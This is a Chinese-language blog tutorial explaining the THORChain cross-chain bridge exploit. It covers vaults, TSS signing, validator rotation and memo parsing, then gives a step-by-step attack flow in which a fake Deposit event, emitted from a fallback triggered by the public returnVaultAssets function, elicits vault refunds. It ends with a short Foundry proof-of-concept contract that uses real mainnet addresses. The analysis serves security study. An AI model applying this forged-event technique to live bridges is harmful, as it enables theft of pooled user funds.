<!--StartFragment-->

# 一. THORChain 的背景知识

THORChain 是一个跨链桥。最基础的特点和其他桥都一样。验证节点监听原链的交易，验证没有问题，就把交易传递到目标链去执行。

![7crossbridge_thorchain_1_.png](https://img.learnblockchain.cn/attachments/2023/12/1vT3nhlN657c642f5038d.png)

下面围绕这几个关键词简单说下 THORChain：金库， TSS，轮班，Memo解析，Router。

- 金库：用户的token，流动性提供者的token都存在这里，类似uniswap的pool。

- TSS：金库太重要了，为了安全，就需要多个验证者共同签名才能转移token，每个验证者相当于拿的都是私钥碎片，多个（一般超过2/3）验证者的私钥才是一个完整的金库地址的私钥。

- 轮班：为了安全，验证者工作一段时间，就要离开，替补验证者登台干活。验证者轮班了，私钥也就变了，金库也得变。所以轮班的不只是验证者还有金库。

- Router：路由合约，函数都由金库来操作。结合前面的知识就是：超过2/3的验证节点通过私钥签名，控制金库账户来调用Router合约。轮班时，金库=>新金库，就需要转移资产，调用的`returnVaultAssets`，本次漏洞攻击就在这个函数。

- Memo解析：验证者，监听Router合约的Event事件来判断原链的交易，如果是 `Deposit` 事件，解析Memo字段，Memo是个拼接信息的字符串，判断去哪个链？要交易哪个Token？要多少？token最后发给哪个地址。


可以结合这三张图看上面的文字
![7crossbridge_thorchain_2_轮班制度_.png](https://img.learnblockchain.cn/attachments/2023/12/BkAG6hZ6657d18b3b7ed0.png)



![7crossbridge_thorchain_3_转移金库_.png](https://img.learnblockchain.cn/attachments/2023/12/S4vFtmWU657d18d3ac29e.png)



![7crossbridge_thorchain_4_解析memo_.png](https://img.learnblockchain.cn/attachments/2023/12/kfxKjWQp657d18deec3c5.png)



# 二. 攻击流程

## 概述攻击步骤
- step1 攻击者创建**攻击合约A**，等待后面的重入时机。
- step2 攻击者调用 `THORChain` 的 `Router` 合约的 `returnVaultAssets(address router, address payable asgard, Coin[] memory coins, string memory memo)`。第一个参数传入**攻击合约A**的地址。
- step3 Route转账ETH，调用**攻击合约A**的 `fallback` 方法。
- step4 **攻击合约A**的 `fallback`，emit一个 `Deposit` 事件，Memo随便写，只要写的不符合规范就行。
- step5   `THORChain` 验证节点，监听到 `Deposit` 事件，就认为有用户存钱了，但是解析Memo字段失败，就从金库中给用户退款。（其实用户没转钱，只是伪造了一个 `Deposit` 事件。 ）


## 图片解释攻击流程


![7crossbridge_thorchain_6_整体流程_.png](https://img.learnblockchain.cn/attachments/2023/12/YpjXFxdK657d746d09713.png)


# 三. POC


## 准备工作

### 最佳学习资料：[DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs)

[SunWeb3Sec: 3. 自己动手写POC1 (Price Oracle Manipulation)](https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/academy/onchain_debug/03\_write_your_own_poc)\
[SunWeb3Sec: 4. 自己动手写POC2 - MEV Bot](https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/academy/onchain_debug/04\_write_your_own_poc/)\
[SunWeb3Sec: 6. 自己动手写POC3 (Reentrancy)](https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/academy/onchain_debug/06\_write_your_own_poc/)

工程里有大量POC代码，非常推荐！！！



## 开始开始POC逻辑

写了很多次POC，这次是唯一一次，不是攻击合约主动调用的攻击流程。
攻击合约只有一个函数 `fallback`，被动等待Router的`returnVaultAssets`调用。
`fallback`执行后，也不会立刻成功，可能是几个区块后，验证者节点解析了 `Deposit`事件失败，决定退款，攻击者才会得到`Vault`的转账。

于是最终的结果需要验证节点来驱动。所以，这个POC写完了也无法验证结果。


```solidity
contract ContractTest is Test{

    event Deposit(address indexed to, address indexed asset, uint amount, string memo);

    function setUp() public {
        vm.createSelectFork('mainnet', 12878653 - 1);
    }

    fallback() external payable {
        address vaultAddress = address(0xf56cba49337a624e94042e325ad6bc864436e370);
        address XRUNEAddress = address(0x69fa0fee221ad11012bab0fdb45d444d3d2ce71c);
        uint safeAmount = 20_867_082_192_584_947_929_101_400;
        string memory memo = "10% VAR bounty would have prevented this";
        emit Deposit(vaultAddress, XRUNEAddress, safeAmount, memo);
    }

}
```


注意，`returnVaultAssets` 这个函数就不是给用户调用的，是给金库调用的。攻击人调用，就是看中了它能transfer ETH触发fallback，并且它是`public`的漏洞。







<!--EndFragment-->